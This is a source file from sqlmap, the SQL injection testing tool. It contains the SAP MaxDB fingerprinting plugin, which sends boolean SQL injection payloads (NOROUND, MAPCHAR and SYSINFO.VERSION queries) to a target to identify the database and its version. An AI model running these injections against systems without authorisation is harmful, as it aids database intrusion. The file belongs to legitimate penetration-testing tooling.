#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import getUnicode
from lib.core.common import randomInt
from lib.core.common import randomRange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.session import setDbms
from lib.core.settings import MAXDB_ALIASES
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self)

    def __versionCheck(self):
        infoMsg = "executing SAP MaxDB SYSINFO version check"
        logger.info(infoMsg)

        query   = agent.prefixQuery("/* NoValue */")
        query   = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        result  = Request.queryPage(payload)

        if not result:
            warnMsg = "unable to perform SAP MaxDB version check"
            logger.warn(warnMsg)

            return None

        minor, major = None, None

        for version in [6, 7]:
            query   = agent.prefixQuery("AND (SELECT MAJORVERSION FROM SYSINFO.VERSION)=%d" % version)
            query   = agent.suffixQuery(query)
            payload = agent.payload(newValue=query)
            result  = Request.queryPage(payload)

            if result:
                major = version

        for version in xrange(0, 10):
            query   = agent.prefixQuery("AND (SELECT MINORVERSION FROM SYSINFO.VERSION)=%d" % version)
            query   = agent.suffixQuery(query)
            payload = agent.payload(newValue=query)
            result  = Request.queryPage(payload)

            if result:
                minor = version

        if major and minor:
            return "%s.%s" % (major, minor)
        else:
            return None

    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        blank   = " " * 15
        value  += "back-end DBMS: "

        if not conf.extensiveFp:
            value += DBMS.MAXDB
            return value

        actVer = formatDBMSfp() + " (%s)" % self.__versionCheck()
        blank  = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            value += "\n%sbanner parsing fingerprint: -" % blank

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        if (kb.dbms is not None and kb.dbms.lower() in MAXDB_ALIASES) or conf.dbms in MAXDB_ALIASES:
            setDbms(DBMS.MAXDB)

            self.getBanner()

            if not conf.extensiveFp:
                return True

        logMsg = "testing SAP MaxDB"
        logger.info(logMsg)

        randInt = randomInt()

        payload = agent.fullPayload("AND NOROUND(%d)=%d" % (randInt, randInt))
        result  = Request.queryPage(payload)

        if result:
            logMsg = "confirming SAP MaxDB"
            logger.info(logMsg)

            payload = agent.fullPayload("AND MAPCHAR(NULL,1,DEFAULTMAP) IS NULL")
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DBMS is not SAP MaxDB"
                logger.warn(warnMsg)

                return False

            setDbms(DBMS.MAXDB)

            self.getBanner()

            if not conf.extensiveFp:
                return True

            kb.dbmsVersion = None

            return True
        else:
            warnMsg = "the back-end DBMS is not SAP MaxDB"
            logger.warn(warnMsg)

            return False

    def forceDbmsEnum(self):
        conf.db = "SAP MaxDB (*)"
